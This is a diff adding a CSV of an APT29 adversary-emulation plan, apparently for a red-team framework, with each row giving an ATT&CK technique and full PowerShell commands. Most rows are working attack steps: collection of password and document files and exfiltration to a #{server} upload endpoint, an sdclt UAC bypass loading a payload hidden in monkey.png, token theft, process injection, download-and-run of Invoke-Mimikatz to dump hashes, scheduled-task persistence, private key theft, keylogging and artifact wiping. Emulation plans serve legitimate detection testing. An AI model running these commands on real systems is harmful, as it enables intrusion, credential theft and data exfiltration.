@@ -1,0 +1,470 @@
+﻿source_org,plan_id,adversary_name,scenario_id,step_idx,yaml_step_id,procedure_step,tactic,technique_attack_id,technique_name,name,description,command_summary,command_full
+apt29,apt29,APT29,1,1,571845f6-b75c-4b9d-a666-a78f7827261f,1.A,execution,T1036.002,Masquerading: Right-to-Left Override,RTLO Start Sandcat,Perform RTLO technique with SANDCAT,"Sleep 3; $bin = Get-ChildItem *cod*scr*; $arguments = '-server ""#{server}"" -group ""rtlo_group""'; start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments; if ($?) { write-host ""Successfully ...","Sleep 3;
+$bin = Get-ChildItem *cod*scr*;
+$arguments = '-server ""#{server}"" -group ""rtlo_group""';
+start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;
+
+if ($?) {
+  write-host ""Successfully completed RTLO execution. A new agent should appear"";
+  exit 0;
+
+} else {
+  write-host ""Failure of RTLO execution."";
+  exit 1;
+}"
+apt29,apt29,APT29,1,2,a5daa530-c640-49bc-aa54-6808789a684a,1.B,execution,T1059.001,Command and Scripting Interpreter: PowerShell,PowerShell,Spawn powershell.exe from cmd.exe,"powershell.exe; if ($?) { write-host ""[*] PowerShell successfully spawned""; exit 0; }","powershell.exe;
+if ($?) {
+  write-host ""[*] PowerShell successfully spawned"";
+  exit 0;
+}"
+apt29,apt29,APT29,2,3,5692da31-3586-4e4f-8f07-5750070c730b,2.A.1,collection,T1119,Automated Collection,Automated Collection,Execute PowerShell from cmd.exe to collect and compress files of specific extensions.,"$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*ad...","$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force"
+apt29,apt29,APT29,2,4,ee08a427-1e1d-4d8a-aeb1-978a7fcf9087,2.A.2,discovery,T1016,System Network Configuration Discovery,System Network Configuration Discovery,The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information.,ipconfig /all,ipconfig /all
+apt29,apt29,APT29,2,5,64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce,2.A.3,discovery,T1016,System Network Configuration Discovery,System Network Configuration Discovery,The arp utility is executed via cmd to enumerate local ARP configuration information.,arp -a,arp -a
+apt29,apt29,APT29,2,6,35d95b64-c1f8-4ac7-a2f2-8959218239cd,2.B.1,discovery,T1033,System Owner/User Discovery,System Owner / User Discovery,The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain.,echo %USERDOMAIN%\%USERNAME%,echo %USERDOMAIN%\%USERNAME%
+apt29,apt29,APT29,2,7,68e209dd-f354-4adc-8bc6-e85a3e55a7f4,2.B.2,exfiltration,T1041,Exfiltration Over Command and Control Channel,Data from staged fileand Exfiltration over C2 Channel,Copy a target file from a remote file share through the existing C2 channel,"Import-Module .\upload.ps1 -Verbose -Force; Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\AppData\Roaming\Draft.zip"" -Uri ""#{server}/file/upload"";","Import-Module .\upload.ps1 -Verbose -Force;
+Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\AppData\Roaming\Draft.zip"" -Uri ""#{server}/file/upload"";"
+apt29,apt29,APT29,2,8,5df12481-9d8c-4235-b550-9cefc8ed7361,2.C.1,discovery,T1057,Process Discovery,Process Discovery,API call(s) are executed to enumerate local running processes.,Import-Module .\ps.ps1 -Verbose -Force; ProcessList,"Import-Module .\ps.ps1 -Verbose -Force;
+ProcessList"
+apt29,apt29,APT29,2,9,41610306-087c-4c34-874b-37b8ed633a36,2.C.2,discovery,T1057,Process Discovery,Process Discovery,The tasklist utility is executed via cmd to enumerate local running processes.,tasklist /v,tasklist /v
+apt29,apt29,APT29,2,10,2ff877b4-0c00-401e-9d3f-070c70b610df,2.D.1,discovery,T1007,System Service Discovery,System Service Discovery,The sc utility is executed via cmd to enumerate local active services.,sc query,sc query
+apt29,apt29,APT29,2,11,144b1384-5060-494f-80eb-91772695cdf3,2.D.2,discovery,T1007,System Service Discovery,System Service Discovery,The net utility is executed via cmd to enumerate local active services.,net start,net start
+apt29,apt29,APT29,2,12,d2ea2676-7f85-4228-b980-ab3c0e1adc03,2.E.1,discovery,T1082,System Information Discovery,System Information Discovery,The systeminfo utility is executed via cmd to enumerate local operating system configuration.,systeminfo,systeminfo
+apt29,apt29,APT29,2,13,7c2a6e5b-1adb-464f-a581-4677391f8dd6,2.E.2,discovery,T1082,System Information Discovery,System Information Discovery,The net utility is executed via cmd to enumerate local operating system configuration.,net config workstation,net config workstation
+apt29,apt29,APT29,2,14,faa96e7f-081a-40b7-a743-a6a7f2627ea3,2.F.1,discovery,T1069,Permission Groups Discovery,Permissions Groups Discovery,The net utility is executed via cmd to enumerate members of the local system's administrators group.,net localgroup administrators,net localgroup administrators
+apt29,apt29,APT29,2,15,26181249-be75-41ed-9fe7-5c30ea8c2d4d,2.F.2,discovery,T1069,Permission Groups Discovery,Permissions Groups Discovery,The net utility is executed via cmd to enumerate members of the domain controller’s administrators group.,net localgroup administrators /domain,net localgroup administrators /domain
+apt29,apt29,APT29,2,16,84377d7a-0363-44fd-a082-44657ca1858f,2.F.3,discovery,T1069,Permission Groups Discovery,Permissions Groups Discovery,The net utility is executed via cmd to enumerate members of the domain administrators group.,"cmd.exe /c net group ""Domain Admins"" /domain","cmd.exe /c net group ""Domain Admins"" /domain"
+apt29,apt29,APT29,2,17,61221fb9-cb32-46d5-98fd-90567a621526,2.G.1,discovery,T1087,Account Discovery,Account Discovery,The net utility is executed via cmd to enumerate domain user accounts.,net user /domain,net user /domain
+apt29,apt29,APT29,2,18,9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76,2.G.2,discovery,T1087,Account Discovery,Account Discovery,The net utility is executed via cmd to enumerate detailed information about a specific user account.,net user %USERNAME% /domain,net user %USERNAME% /domain
+apt29,apt29,APT29,2,19,5c23f638-9cfc-4fc4-9cab-4af628fef70a,2.H.1,discovery,T1012,Query Registry,Query Registry,The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.,reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System,reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+apt29,apt29,APT29,3,20,68b588bc-002a-42dc-bac7-9189f944065b,3.A.1,defensive-evasion,T1036.005,Masquerading: Match Legitimate Name or Location,Staging monkey PNG,Staging PNG for Lateral Movement,"$username=""#{profile_user}""; if ( $(test-path -path ""C:\Users\$username\Downloads\monkey.png"") -eq $false ) { copy-item monkey.png -Destination ""C:\Users\$username\Downloads\\"" -Force; if ($? -eq $True) { write-host ""...","$username=""#{profile_user}"";
+if ( $(test-path -path ""C:\Users\$username\Downloads\monkey.png"") -eq $false ) {
+  copy-item monkey.png -Destination ""C:\Users\$username\Downloads\\"" -Force;
+  if ($? -eq $True) {
+    write-host ""[+] Successfully copied monkey.png!"";
+    get-childitem -path ""C:\Users\$username\Downloads\\"";
+    exit 0;
+  } else {
+    write-host ""[+] Failed to copy monkey.png."";
+    exit 1;
+  }"
+apt29,apt29,APT29,3,21,1345bff7-6f26-43b2-a92a-9aabccdb3db0,3.A.2,privilege-escalation,T1134.001,Access Token Manipulation: Token Impersonation/Theft,Bypass User Account Control,"A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force; Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force; $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(...,"Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
+Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
+Invoke-BypassUACTokenManipulation -Arguments ""-nop -exec bypass -EncodedCommand $pcode"" -Verbose"
+apt29,apt29,APT29,3,22,89e9dffa-8836-4672-8cf3-bebd006d2a2b,3.A.3,privilege-escalation,T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UAC Bypass via Backup Utility,Modify registry values of sdclt to bypass UAC,"if (!(test-path -path $env:windir\system32\sdclt.exe)) { write-host ""[!] sdclt.exe was not found on this host.""; exit 1; } New-Item -Path HKCU:\Software\Classes -Name Folder -Force; New-Item -Path HKCU:\Software\Class...","if (!(test-path -path $env:windir\system32\sdclt.exe)) {
+  write-host ""[!] sdclt.exe was not found on this host."";
+  exit 1;
+}
+New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
+New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
+New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
+New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
+
+$username=""#{profile_user}"";
+$payload='powershell.exe -noni -noexit -ep bypass -window hidden -c ""sal a New-Object;Add-Type -AssemblyName ""System.Drawing""; $g=a System.Drawing.Bitmap(""C:\Users\$($username)\Downloads\monkey.png"");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))""';
+
+Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""(Default)"" -Value $payload -Force;
+Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force;
+
+cmd.exe /c sdclt.exe;
+cmd.exe /c powershell.exe;"
+apt29,apt29,APT29,3,23,5ff80022-8d85-410b-b868-6c7565b267e5,3.B,defensive-evasion,T1112,Modify Registry,Registry Cleanup for UAC Bypass Technique,Delete registry entries post-UAC bypass.,"Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force; if (!(test-path -path HKCU:\Software\Classes\Folder)) { write-host ""[+] Reg keys removed!""; }","Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
+if (!(test-path -path HKCU:\Software\Classes\Folder)) {
+  write-host ""[+] Reg keys removed!"";
+  }"
+apt29,apt29,APT29,3,24,088b8639-3f37-42cc-9dc8-01aabb645461,3.C,privilege-escalation,T1055,Process Injection,Process Injection,"The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT.","Import-Module .\Invoke-PSInject.ps1 -Verbose -Force; Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force; $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $en...","Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
+Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
+Inject -PoshCode $pcode;"
+apt29,apt29,APT29,4,25,4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d,4.A.1,stage-capabilities,T1036.005,Masquerading: Match Legitimate Name or Location,Planting Modified Sysinternals Utilities,Uploading payloads masquerading as via modified SysInternalsSuite,"iwr -uri ""https://download.sysinternals.com/files/SysinternalsSuite.zip"" -outfile SysInternalsSuite.zip; Expand-Archive -Path SysInternalsSuite.zip -DestinationPath ""C:\Users\#{profile_user}\Downloads\SysInternalsSuit...","iwr -uri ""https://download.sysinternals.com/files/SysinternalsSuite.zip"" -outfile SysInternalsSuite.zip;
+Expand-Archive -Path SysInternalsSuite.zip -DestinationPath ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -Force;
+
+if (! $?) {
+  write-host ""Error moving files to #{profile_user}\Downloads"";
+  exit 1;
+}
+
+Move-Item Modified-SysInternalsSuite.zip ""C:\Users\#{profile_user}\Downloads"" -Force;
+Expand-Archive -LiteralPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -DestinationPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -Force;
+
+if (! $?) {
+  write-host ""Error expanding files to #{profile_user}\Downloads"";
+  exit 1;
+}
+
+$dir_exists=Test-Path -path ""C:\Program Files\SysInternalsSuite"";
+if ($dir_exists -eq $true) {
+  write-host ""[*] SysInternalsSuite folder exists within \""C:\Program Files\"", copying over payloads then removing folder from Downloads."";
+  Move-Item -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+  Move-Item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+} else {
+  mkdir ""C:\Program Files\SysInternalsSuite"";
+  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
+}
+
+if (test-path -path ""SysInternalsSuite.zip"") {
+  Remove-Item -path ""filesystem::SysInternalsSuite.zip"" -force;
+}
+
+if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" ) {
+  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -force;
+}
+
+if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"") {
+  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -recurse -force;
+}
+
+if (test-path -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"") {
+  Remove-Item -path  ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -recurse -force;
+}
+
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+if ($?) {
+  gci;
+  write-host ""[*] Successfully planted files""
+} else {
+  write-host ""[!] Error downloading and planting modified system tools.""
+}"
+apt29,apt29,APT29,4,26,59592c35-8207-4896-8d8b-36ad4600245d,4.A.2,discovery,T1018,Remote System Discovery,Remote System Discovery,The net utility is executed via cmd to enumerate DCs within the domain,"cmd.exe /c net group ""Domain Controllers"" /domain","cmd.exe /c net group ""Domain Controllers"" /domain"
+apt29,apt29,APT29,4,27,24ed020e-4730-4000-b6b4-6b5d3e95314f,4.A.3,discovery,T1018,Remote System Discovery,Remote System Discovery,The net utility is executed via cmd to enumerate hosts within the domain.,"cmd.exe /c net group ""Domain Computers"" /domain","cmd.exe /c net group ""Domain Computers"" /domain"
+apt29,apt29,APT29,4,28,5f4263c4-7ff1-4098-b5f5-f41faa31cf5b,4.B.1,discovery,T1016,System Network Configuration Discovery,System Network Configuration Discovery,The netsh utility is executed via cmd to enumerate local firewall configuration information.,netsh advfirewall show allprofiles,netsh advfirewall show allprofiles
+apt29,apt29,APT29,4,29,646be6c9-f27a-4f5f-be5d-b8a0317e215f,4.B.2,discovery,T1057,Process Discovery,Process Discovery,List running process on the machine via PowerShell.,$ps = get-process; write-output $ps;,"$ps = get-process;
+write-output $ps;"
+apt29,apt29,APT29,4,30,9b5b5aec-32ff-4d74-8555-727b50ab15f6,4.B.3,defensive-evasion,T1070.004,Indicator Removal on Host: File Deletion,Artifact Cleanup - Delete Files,Cleanup files related to Operation,"if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"";)) { write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\Sys...","if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"";)) {
+  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+gci $env:userprofile\Desktop;
+.\sdelete64.exe /accepteula ""$env:USERPROFILE\Desktop\‮cod.3aka3.scr"";
+.\sdelete64.exe /accepteula ""$env:APPDATA\Draft.Zip"";
+.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysInternalsSuite.zip"";"
+apt29,apt29,APT29,4,31,6f1f4768-7099-45d2-a858-b49dc792234e,4.C.1,discovery,T1082,System Information Discovery,Loading Stage-2 & Performing Discovery,Load Stage-2 from Modified Sysinternals Toolset,"if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) { write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\SysI...","if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+if (!(test-path "".\readme.ps1"")) {
+  Move-Item .\readme.txt readme.ps1 -Force;
+}
+. .\readme.ps1;
+Invoke-Discovery;"
+apt29,apt29,APT29,4,32,ba0b398d-91b8-490a-bed2-f959afa8e1aa,4.C.2,discovery,T1049,System Network Connections Discovery,4.C.2 - System Network Connections Discovery (T1049),The netstat utility is executed via cmd to enumerate local active network connections.,netstat -ano,netstat -ano
+apt29,apt29,APT29,5,33,effbedc1-1bc8-4a75-9395-980559700008,5.A.1,credential-access,T1003,Credential Dumping,Credential Dumping using Process Injection,Mimikatz lsadump::sam is executed via Invoke-Mimikatz to dump hashes via process injection into LSASS.,"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }; $web = (New-Object System.Net.WebClient); $result = $web.DownloadString(""https://raw.githubusercontent.com/EmpireProject/Empire/master...","[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+$web = (New-Object System.Net.WebClient);
+$result = $web.DownloadString(""https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"");
+iex $result;
+function hashdump
+{
+    Invoke-Mimikatz -Command ""privilege::debug token::elevate lsadump::sam exit""
+};
+hashdump;"
+apt29,apt29,APT29,5,34,9c75155e-21ab-4471-af16-45f3795a313c,5.A.2,persistence,T1547.009,Boot or Logon Autostart Execution: Shortcut Modification,Persistent Service 1,Leverage modified Sysinternals,"Set-Location -path ""C:\Program Files\SysinternalsSuite""; if (get-service -name ""javamtsup"" -ErrorAction SilentlyContinue) { write-host ""[*] Service already exists...Not running persistence step-1""; exit 1; } if (Test-...","Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+if (get-service -name ""javamtsup"" -ErrorAction SilentlyContinue) {
+  write-host ""[*] Service already exists...Not running persistence step-1"";
+  exit 1;
+}
+
+if (Test-Path -path ""readme.ps1"") {
+  . .\readme.ps1;
+  Invoke-Persistence -PersistStep 1;
+  write-host ""[+] Persistence 1 invoked."";
+  exit 0;
+
+} else {
+  write-host ""[!] readme.ps1 not found."";
+  exit 1;
+}"
+apt29,apt29,APT29,5,35,45f18b58-c14f-4b61-a3da-41b67af21429,5.B.1,persistence,T1547.009,Boot or Logon Autostart Execution: Shortcut Modification,Persistent Service 2,Leverage modified Sysinternals,"Set-Location -path ""C:\Program Files\SysinternalsSuite""; if (Test-Path -path ""readme.ps1"") { . .\readme.ps1; Invoke-Persistence -PersistStep 2; write-host ""[+] Persistence 2 invoked.""; } else { write-host ""[!] readme....","Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+if (Test-Path -path ""readme.ps1"") {
+  . .\readme.ps1;
+  Invoke-Persistence -PersistStep 2;
+  write-host ""[+] Persistence 2 invoked."";
+
+} else {
+  write-host ""[!] readme.ps1 not found."";
+  return 1;
+}"
+apt29,apt29,APT29,5,36,03afada1-1714-408f-bde5-f528b91dc89d,5.B.2,defensive-evasion,T1134,Access Token Manipulation,Access Token Manipulation,"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...","Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;"
+apt29,apt29,APT29,6,37,e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d,6.A.1,credential-access,T1003,Credential Dumping,Credentials In Files- Chrome,Obtain credentials from Chrome Dumper,"if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) { write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\Sysi...","if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+./accesschk.exe -accepteula .;"
+apt29,apt29,APT29,6,38,1b9e018d-986d-42d9-bb8b-0e104e98ce9c,6.A.2,defensive-evasion,T1134,Access Token Manipulation,Query Registry,"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...","Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;"
+apt29,apt29,APT29,6,39,c4f4b13c-87b6-498c-b814-93570173068c,6.B,credential-access,T1552.004,Unsecured Credentials: Private Keys,Credentials In Files (T1081) - Private Keys Extraction,Obtain credentials via Custom PowerShell,"Import-PfxCertificate -Exportable -FilePath "".\dmevals.local.pfx"" -CertStoreLocation Cert:\LocalMachine\My; if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) { write-host ""[!] The path C:\Program Files\Sy...","Import-PfxCertificate -Exportable -FilePath "".\dmevals.local.pfx"" -CertStoreLocation Cert:\LocalMachine\My;
+
+if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\readme.ps1;
+Get-PrivateKeys;
+if ($? -eq $True) {
+    write-host ""[+] Successfully executed private key collection script."";
+    exit 0;
+} else {
+    write-host ""[!] Error, could not execution Get-PrivateKeys."";
+    exit 1;
+}"
+apt29,apt29,APT29,7,40,a4b14c10-49aa-4ae4-b165-d5a37364fe62,7.A.1,defensive-evasion,T1036.005,Masquerading: Match Legitimate Name or Location,Staging files for PowerShell module imports,Renaming psversion.txt to psversion.txt to be imported,"if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) { write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\SysI...","if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+if (test-path -path "".\psversion.txt"" ) {
+  move-item .\psversion.txt psversion.ps1 -Force;
+}
+  write-host ""[+] File psversion.ps1 staged to be imported."""
+apt29,apt29,APT29,7,41,a81ea4ad-bc9f-49a7-82d4-4466df641487,7.A.2,collection,T1113,Screen Capture,Screen Capturing,Load custom PowerShell module and take screenshots.,"if (! $(test-path -path ""C:\Program Files\SysinternalsSuite\psversion.ps1"";)) { write-host ""[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped.""; exit 1; } Set-Location...","if (! $(test-path -path ""C:\Program Files\SysinternalsSuite\psversion.ps1"";)) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\psversion.ps1;
+Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName ""Screenshot"";"
+apt29,apt29,APT29,7,42,ee4c2eab-be57-434c-a32c-14b77360301a,7.A.3,collection,T1115,Clipboard Data,Automated Collection (T1119) - Clipboard (T1115),Get contents of clipboard,"$clip_data=get-clipboard; if ($clip_data.Length -gt 0) { write-host ""[+] Clipboard data obtained!\n""; write-host $clip_data; } else { write-host ""[!] No clipboard data available!\n""; }","$clip_data=get-clipboard;
+if ($clip_data.Length -gt 0) {
+  write-host ""[+] Clipboard data obtained!\n"";
+  write-host $clip_data;
+} else {
+  write-host ""[!] No clipboard data available!\n"";
+}"
+apt29,apt29,APT29,7,43,db28f68d-e8b8-46e6-b680-642570d4b257,7.A.4,collection,T1056.001,Input Capture: Keylogging,Automated Collection (T1119) - Input Capture (T1417),"Load custom PowerShell module, and grab keystrokes for 15 seconds.","if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) { write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\Sysi...","if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\psversion.ps1;
+Get-Keystrokes;
+Start-Sleep -Seconds 15;
+View-Job -JobName ""Keystrokes"";"
+apt29,apt29,APT29,7,44,a612311d-a802-48da-bb7f-88a4b9dd7a24,7.B.1,exfiltration,T1041,Exfiltration Over C2 Channel,Data from staged file (T1074) and Exfiltration over C2 Channel (T1041),Compress all data within Download directory and exfiltrate the results.,"Write-Host ""[*] Compressing all the things in download dir""; Compress-Archive -Path ""C:\Users\#{profile_user}\Downloads\*.*"" -DestinationPath ""$env:APPDATA\OfficeSupplies.zip""; Import-Module .\upload.ps1 -Verbose -For...","Write-Host ""[*] Compressing all the things in download dir"";
+Compress-Archive -Path ""C:\Users\#{profile_user}\Downloads\*.*"" -DestinationPath ""$env:APPDATA\OfficeSupplies.zip"";
+
+Import-Module .\upload.ps1 -Verbose -Force;
+Invoke-MultipartFormDataUpload -InFile ""$env:APPDATA\OfficeSupplies.zip"" -Uri ""#{server}/file/upload"";
+if ($?) {
+  write-host ""[+] Data exfil of download directory completed!"";
+} else {
+  write-host ""[!] Data exfil failed!"";
+}"
+apt29,apt29,APT29,7,45,9b518cfb-125f-466e-872b-4f8171773ce5,7.B.2,defensive-evasion,T1134.001,Access Token Manipulation: Token Impersonation/Theft,Remote File Copy (T1105),"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...","Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;"
